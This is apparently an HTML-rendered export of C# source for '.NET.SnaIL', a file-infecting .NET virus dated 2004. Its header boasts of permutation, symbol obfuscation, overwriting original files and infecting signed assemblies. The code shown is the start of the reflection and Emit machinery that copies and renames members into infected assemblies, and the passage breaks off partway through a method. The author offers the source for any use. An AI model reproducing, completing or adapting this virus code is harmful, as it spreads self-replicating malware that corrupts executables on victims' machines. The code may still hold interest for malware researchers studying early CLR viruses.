<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #008000;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc6 {
	color: #808080;
}
.sc7 {
	color: #808080;
}
.sc9 {
	color: #804000;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc16 {
	color: #8000FF;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">
</span><span class="sc1">/*
 *  
 * .NET.SnaIL RC2
 * 
 * Features: 
 * - pure .NET virus (doesn't use any Win32 API)
 * - multithreaded
 * - permutation (inserting nop and ldloc/pop trash)
 * - obfuscation (changing names of symblos)
 * 
 * You may make with this sources anything you wish. 
 * Author is not responsible for consequences.
 *
 * (c) whale 2004
 */</span><span class="sc0">


</span><span class="sc2">//#define DEBUGCONSOLE      // debug console
</span><span class="sc0">
</span><span class="sc9">#define MANAGEDRESOURCES  </span><span class="sc2">// create managed resources in infected file (beta-testing feature)
</span><span class="sc0">
</span><span class="sc9">#define PERMUTATION
</span><span class="sc0">
</span><span class="sc9">#define OVERWRITE           </span><span class="sc2">// overwrite original file with infected 
</span><span class="sc0">
</span><span class="sc9">#define INFECTSIGNED    </span><span class="sc2">// infect signed assemblies
</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Reflection</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Globalization</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Resources</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">IO</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Collections</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Reflection</span><span class="sc10">.</span><span class="sc11">Emit</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Threading</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">Reflector</span><span class="sc10">.</span><span class="sc11">Disassembler</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Runtime</span><span class="sc10">.</span><span class="sc11">Remoting</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">namespace</span><span class="sc0"> </span><span class="sc11">DotNet</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">

    </span><span class="sc5">internal</span><span class="sc0"> </span><span class="sc16">class</span><span class="sc0"> </span><span class="sc11">Snail</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">copyright</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"[ .NET.Snail - sample CLR virus (c) whale 2004 ]"</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc2">// non-static constructor
</span><span class="sc0">        </span><span class="sc2">// needed to run virus in separate domain
</span><span class="sc0">        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc11">Snail</span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">inFileName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">outFileName</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">try</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">Snail</span><span class="sc10">.</span><span class="sc11">shorts</span><span class="sc10">=</span><span class="sc5">true</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">Snail</span><span class="sc10">.</span><span class="sc11">ProcessAssembly</span><span class="sc10">(</span><span class="sc11">inFileName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">outFileName</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">Snail</span><span class="sc10">.</span><span class="sc11">shorts</span><span class="sc10">)</span><span class="sc0">
                    </span><span class="sc11">Snail</span><span class="sc10">.</span><span class="sc11">ProcessAssembly</span><span class="sc10">(</span><span class="sc11">inFileName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">outFileName</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc5">catch</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ThreadAbortException</span><span class="sc0"> </span><span class="sc11">e</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">File</span><span class="sc10">.</span><span class="sc11">Move</span><span class="sc10">(</span><span class="sc11">inFileName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">outFileName</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc5">catch</span><span class="sc10">(</span><span class="sc11">Exception</span><span class="sc0"> </span><span class="sc11">e</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc9">#if DEBUGCONSOLE
</span><span class="sc0">                </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">WriteLine</span><span class="sc10">(</span><span class="sc11">e</span><span class="sc10">.</span><span class="sc11">Message</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc2">//              Console.WriteLine();
</span><span class="sc0">            </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">class</span><span class="sc0"> </span><span class="sc11">Objects</span><span class="sc0"> 
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">Hashtable</span><span class="sc0"> </span><span class="sc11">types</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ctors</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">events</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">fields</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">methods</span><span class="sc10">,</span><span class="sc0"> 
                </span><span class="sc11">props</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc11">Objects</span><span class="sc10">()</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">types</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Hashtable</span><span class="sc10">();</span><span class="sc0">
                </span><span class="sc11">ctors</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Hashtable</span><span class="sc10">();</span><span class="sc0">
                </span><span class="sc11">events</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Hashtable</span><span class="sc10">();</span><span class="sc0">
                </span><span class="sc11">fields</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Hashtable</span><span class="sc10">();</span><span class="sc0">
                </span><span class="sc11">methods</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Hashtable</span><span class="sc10">();</span><span class="sc0">
                </span><span class="sc11">props</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Hashtable</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">

            </span><span class="sc10">~</span><span class="sc11">Objects</span><span class="sc10">()</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">

            </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">Clear</span><span class="sc10">()</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">types</span><span class="sc10">.</span><span class="sc11">Clear</span><span class="sc10">();</span><span class="sc0">
                </span><span class="sc11">ctors</span><span class="sc10">.</span><span class="sc11">Clear</span><span class="sc10">();</span><span class="sc0">
                </span><span class="sc11">events</span><span class="sc10">.</span><span class="sc11">Clear</span><span class="sc10">();</span><span class="sc0">
                </span><span class="sc11">fields</span><span class="sc10">.</span><span class="sc11">Clear</span><span class="sc10">();</span><span class="sc0">
                </span><span class="sc11">methods</span><span class="sc10">.</span><span class="sc11">Clear</span><span class="sc10">();</span><span class="sc0">
                </span><span class="sc11">props</span><span class="sc10">.</span><span class="sc11">Clear</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">

            </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">AddType</span><span class="sc10">(</span><span class="sc11">Type</span><span class="sc0"> </span><span class="sc11">intype</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">TypeBuilder</span><span class="sc0"> </span><span class="sc11">outtype</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">types</span><span class="sc10">.</span><span class="sc11">Add</span><span class="sc10">(</span><span class="sc11">intype</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">outtype</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">


            </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">DefineMembers</span><span class="sc10">(</span><span class="sc11">Type</span><span class="sc0"> </span><span class="sc11">intype</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ModuleBuilder</span><span class="sc0"> </span><span class="sc11">moduleBuilder</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">types</span><span class="sc10">.</span><span class="sc11">ContainsKey</span><span class="sc10">(</span><span class="sc11">intype</span><span class="sc10">))</span><span class="sc0">
                    </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc5">foreach</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PropertyInfo</span><span class="sc0"> </span><span class="sc11">pi</span><span class="sc0"> </span><span class="sc5">in</span><span class="sc0"> </span><span class="sc11">intype</span><span class="sc10">.</span><span class="sc11">GetProperties</span><span class="sc10">(</span><span class="sc11">BindingFlags</span><span class="sc10">.</span><span class="sc11">Public</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">BindingFlags</span><span class="sc10">.</span><span class="sc11">NonPublic</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">BindingFlags</span><span class="sc10">.</span><span class="sc11">Static</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">BindingFlags</span><span class="sc10">.</span><span class="sc11">Instance</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">BindingFlags</span><span class="sc10">.</span><span class="sc11">DeclaredOnly</span><span class="sc10">))</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc11">TypeBuilder</span><span class="sc0"> </span><span class="sc11">outproptype</span><span class="sc10">=(</span><span class="sc11">TypeBuilder</span><span class="sc10">)</span><span class="sc11">types</span><span class="sc10">[</span><span class="sc11">pi</span><span class="sc10">.</span><span class="sc11">PropertyType</span><span class="sc10">];</span><span class="sc0">
                    </span><span class="sc11">PropertyBuilder</span><span class="sc0"> </span><span class="sc11">outpb</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">outproptype</span><span class="sc10">!=</span><span class="sc5">null</span><span class="sc10">)</span><span class="sc0">
                        </span><span class="sc11">outpb</span><span class="sc10">=((</span><span class="sc11">TypeBuilder</span><span class="sc10">)</span><span class="sc11">types</span><span class="sc10">[</span><span class="sc11">intype</span><span class="sc10">]).</span><span class="sc11">DefineProperty</span><span class="sc10">(</span><span class="sc0">
                            </span><span class="sc11">EnabledRename</span><span class="sc10">(</span><span class="sc11">intype</span><span class="sc10">)?</span><span class="sc11">rs</span><span class="sc10">.</span><span class="sc11">Next</span><span class="sc10">():</span><span class="sc11">pi</span><span class="sc10">.</span><span class="sc11">Name</span><span class="sc10">,</span><span class="sc0"> 
                            </span><span class="sc11">pi</span><span class="sc10">.</span><span class="sc11">Attributes</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">outproptype</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc5">else</span><span class="sc0">
                        </span><span class="sc11">outpb</span><span class="sc10">=((</span><span class="sc11">TypeBuilder</span><span class="sc10">)</span><span class="sc11">types</span><span class="sc10">[</span><span class="sc11">intype</span><span class="sc10">]).</span><span class="sc11">DefineProperty</span><span class="sc10">(</span><span class="sc0">
                            </span><span class="sc11">EnabledRename</span><span class="sc10">(</span><span class="sc11">intype</span><span class="sc10">)?</span><span class="sc11">rs</span><span class="sc10">.</span><span class="sc11">Next</span><span class="sc10">():</span><span class="sc11">pi</span><span class="sc10">.</span><span class="sc11">Name</span><span class="sc10">,</span><span class="sc0"> 
                            </span><span class="sc11">pi</span><span class="sc10">.</span><span class="sc11">Attributes</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pi</span><span class="sc10">.</span><span class="sc11">PropertyType</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">props</span><span class="sc10">.</span><span class="sc11">Add</span><span class="sc10">(</span><span class="sc11">pi</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">outpb</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc5">foreach</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">FieldInfo</span><span class="sc0"> </span><span class="sc11">fi</span><span class="sc0"> </span><span class="sc5">in</span><span class="sc0"> </span><span class="sc11">intype</span><span class="sc10">.</span><span class="sc11">GetFields</span><span class="sc10">(</span><span class="sc11">BindingFlags</span><span class="sc10">.</span><span class="sc11">Public</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">BindingFlags</span><span class="sc10">.</span><span class="sc11">NonPublic</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">BindingFlags</span><span class="sc10">.</span><span class="sc11">Static</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">BindingFlags</span><span class="sc10">.</span><span class="sc11">Instance</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">BindingFlags</span><span class="sc10">.</span><span class="sc11">DeclaredOnly</span><span class="sc10">))</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc11">TypeBuilder</span><span class="sc0"> </span><span class="sc11">outfieldtype</span><span class="sc10">=(</span><span class="sc11">TypeBuilder</span><span class="sc10">)</span><span class="sc11">types</span><span class="sc10">[</span><span class="sc11">fi</span><span class="sc10">.</span><span class="sc11">FieldType</span><span class="sc10">];</span><span class="sc0">
                    </span><span class="sc11">FieldBuilder</span><span class="sc0"> </span><span class="sc11">outfb</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">outfieldtype</span><span class="sc10">!=</span><span class="sc5">null</span><span class="sc10">)</span><span class="sc0">
                        </span><span class="sc11">outfb</span><span class="sc10">=((</span><span class="sc11">TypeBuilder</span><span class="sc10">)</span><span class="sc11">types</span><span class="sc10">[</span><span class="sc11">intype</span><span class="sc10">]).</span><span class="sc11">DefineField</span><span class="sc10">(</span><span class="sc0">
                            </span><span class="sc11">EnabledRename</span><span class="sc10">(</span><span class="sc11">intype</span><span class="sc10">)?</span><span class="sc11">rs</span><span class="sc10">.</span><span class="sc11">Next</span><span class="sc10">():</span><span class="sc11">fi</span><span class="sc10">.</span><span class="sc11">Name</span><span class="sc10">,</span><span class="sc0"> 
                            </span><span class="sc11">outfieldtype</span><span class="sc10">,</span><span class="sc0">   </span><span class="sc11">fi</span><span class="sc10">.</span><span class="sc11">Attributes</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc5">else</span><span class="sc0">
                        </span><span class="sc11">outfb</span><span class="sc10">=((</span><span class="sc11">TypeBuilder</span><span class="sc10">)</span><span class="sc11">types</span><span class="sc10">[</span><span class="sc11">intype</span><span class="sc10">]).</span><span class="sc11">DefineField</span><span class="sc10">(</span><span class="sc0">
                            </span><span class="sc11">EnabledRename</span><span class="sc10">(</span><span class="sc11">intype</span><span class="sc10">)?</span><span class="sc11">rs</span><span class="sc10">.</span><span class="sc11">Next</span><span class="sc10">():</span><span class="sc11">fi</span><span class="sc10">.</span><span class="sc11">Name</span><span class="sc10">,</span><span class="sc0"> 
                            </span><span class="sc11">fi</span><span class="sc10">.</span><span class="sc11">FieldType</span><span class="sc10">,</span><span class="sc0">   </span><span class="sc11">fi</span><span class="sc10">.</span><span class="sc11">Attributes</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">fields</span><span class="sc10">.</span><span class="sc11">Add</span><span class="sc10">(</span><span class="sc11">fi</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">outfb</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc5">foreach</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ConstructorInfo</span><span class="sc0"> </span><span class="sc11">ci</span><span class="sc0"> </span><span class="sc5">in</span><span class="sc0"> </span><span class="sc11">intype</span><span class="sc10">.</span><span class="sc11">GetConstructors</span><span class="sc10">(</span><span class="sc11">BindingFlags</span><span class="sc10">.</span><span class="sc11">Public</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">BindingFlags</span><span class="sc10">.</span><span class="sc11">NonPublic</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">BindingFlags</span><span class="sc10">.</span><span class="sc11">Static</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">BindingFlags</span><span class="sc10">.</span><span class="sc11">Instance</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">BindingFlags</span><span class="sc10">.</span><span class="sc11">DeclaredOnly</span><span class="sc10">))</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc11">ParameterInfo</span><span class="sc0"> </span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">pinfo</span><span class="sc10">=</span><span class="sc11">ci</span><span class="sc10">.</span><span class="sc11">GetParameters</span><span class="sc10">();</span><span class="sc0">
                    </span><span class="sc11">Type</span><span class="sc0"> </span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">cparams</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Type</span><span class="sc10">[</span><span class="sc11">pinfo</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">];</span><span class="sc0">
                    </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc11">pinfo</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
                    </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc11">TypeBuilder</span><span class="sc0"> </span><span class="sc11">outparamtype</span><span class="sc10">=(</span><span class="sc11">TypeBuilder</span><span class="sc10">)</span><span class="sc11">types</span><span class="sc10">[</span><span class="sc11">pinfo</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">ParameterType</span><span class="sc10">];</span><span class="sc0">
                        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">outparamtype</span><span class="sc10">!=</span><span class="sc5">null</span><span class="sc10">)</span><span class="sc0">                        
                            </span><span class="sc11">cparams</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]=</span><span class="sc11">outparamtype</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc5">else</span><span class="sc0">
                            </span><span class="sc11">cparams</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]=</span><span class="sc11">pinfo</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">ParameterType</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc10">}</span><span class="sc0">
                    </span><span class="sc11">ConstructorBuilder</span><span class="sc0"> </span><span class="sc11">outcb</span><span class="sc10">=((</span><span class="sc11">TypeBuilder</span><span class="sc10">)</span><span class="sc11">types</span><span class="sc10">[</span><span class="sc11">intype</span><span class="sc10">]).</span><span class="sc11">DefineConstructor</span><span class="sc10">(</span><span class="sc0">
                        </span><span class="sc11">ci</span><span class="sc10">.</span><span class="sc11">Attributes</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ci</span><span class="sc10">.</span><span class="sc11">CallingConvention</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">cparams</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">DefCtorParams</span><span class="sc10">(</span><span class="sc11">ci</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">ref</span><span class="sc0"> </span><span class="sc11">outcb</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">ctors</span><span class="sc10">.</span><span class="sc11">Add</span><span class="sc10">(</span><span class="sc11">ci</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">outcb</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc5">foreach</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">EventInfo</span><span class="sc0"> </span><span class="sc11">ei</span><span class="sc0"> </span><span class="sc5">in</span><span class="sc0"> </span><span class="sc11">intype</span><span class="sc10">.</span><span class="sc11">GetEvents</span><span class="sc10">(</span><span class="sc11">BindingFlags</span><span class="sc10">.</span><span class="sc11">Public</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">BindingFlags</span><span class="sc10">.</span><span class="sc11">NonPublic</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">BindingFlags</span><span class="sc10">.</span><span class="sc11">Static</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">BindingFlags</span><span class="sc10">.</span><span class="sc11">Instance</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">BindingFlags</span><span class="sc10">.</span><span class="sc11">DeclaredOnly</span><span class="sc10">))</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc11">EventBuilder</span><span class="sc0"> </span><span class="sc11">outeb</span><span class="sc10">=((</span><span class="sc11">TypeBuilder</span><span class="sc10">)</span><span class="sc11">types</span><span class="sc10">[</span><span class="sc11">intype</span><span class="sc10">]).</span><span class="sc11">DefineEvent</span><span class="sc10">(</span><span class="sc0">
                        </span><span class="sc11">EnabledRename</span><span class="sc10">(</span><span class="sc11">intype</span><span class="sc10">)?</span><span class="sc11">rs</span><span class="sc10">.</span><span class="sc11">Next</span><span class="sc10">():</span><span class="sc11">ei</span><span class="sc10">.</span><span class="sc11">Name</span><span class="sc10">,</span><span class="sc0"> 
                        </span><span class="sc11">ei</span><span class="sc10">.</span><span class="sc11">Attributes</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ei</span><span class="sc10">.</span><span class="sc11">EventHandlerType</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">events</span><span class="sc10">.</span><span class="sc11">Add</span><span class="sc10">(</span><span class="sc11">ei</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">outeb</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc5">foreach</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">MethodBase</span><span class="sc0"> </span><span class="sc11">methodBase</span><span class="sc0"> </span><span class="sc5">in</span><span class="sc0"> </span><span class="sc11">intype</span><span class="sc10">.</span><span class="sc11">GetMethods</span><span class="sc10">(</span><span class="sc11">BindingFlags</span><span class="sc10">.</span><span class="sc11">Public</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">BindingFlags</span><span class="sc10">.</span><span class="sc11">NonPublic</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">BindingFlags</span><span class="sc10">.</span><span class="sc11">Static</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">BindingFlags</span><span class="sc10">.</span><span class="sc11">Instance</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">BindingFlags</span><span class="sc10">.</span><span class="sc11">DeclaredOnly</span><span class="sc10">))</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">methodBase</span><span class="sc10">.</span><span class="sc11">Name</span><span class="sc10">==</span><span class="sc6">"Main"</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">methodBase</span><span class="sc10">.</span><span class="sc11">DeclaringType</span><span class="sc10">==</span><span class="sc5">typeof</span><span class="sc10">(</span><span class="sc11">Snail</span><span class="sc10">))</span><span class="sc0">
                        </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">methodBase</span><span class="sc10">.</span><span class="sc11">Name</span><span class="sc10">==</span><span class="sc6">"Go"</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">methodBase</span><span class="sc10">.</span><span class="sc11">DeclaringType</span><span class="sc10">==</span><span class="sc5">typeof</span><span class="sc10">(</span><span class="sc11">Snail</span><span class="sc10">))</span><span class="sc0">
                        </span><span class="sc11">goBase</span><span class="sc10">=</span><span class="sc11">methodBase</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc11">ParameterInfo</span><span class="sc0"> </span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">pinfo</span><span class="sc10">=</span><span class="sc11">methodBase</span><span class="sc10">.</span><span class="sc11">GetParameters</span><span class="sc10">();</span><span class="sc0">
                    </span><span class="sc11">Type</span><span class="sc0"> </span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">mparams</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Type</span><span class="sc10">[</span><span class="sc11">pinfo</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">];</span><span class="sc0">
                    </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc11">pinfo</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
                    </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc11">TypeBuilder</span><span class="sc0"> </span><span class="sc11">outparamtype</span><span class="sc10">=(</span><span class="sc11">TypeBuilder</span><span class="sc10">)</span><span class="sc11">types</span><span class="sc10">[</span><span class="sc11">pinfo</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">ParameterType</span><span class="sc10">];</span><span class="sc0">
                        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">outparamtype</span><span class="sc10">!=</span><span class="sc5">null</span><span class="sc10">)</span><span class="sc0">                        
                            </span><span class="sc11">mparams</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]=</span><span class="sc11">outparamtype</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc5">else</span><span class="sc0">
                            </span><span class="sc11">mparams</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]=</span><span class="sc11">pinfo</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">ParameterType</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc10">}</span><span class="sc0">
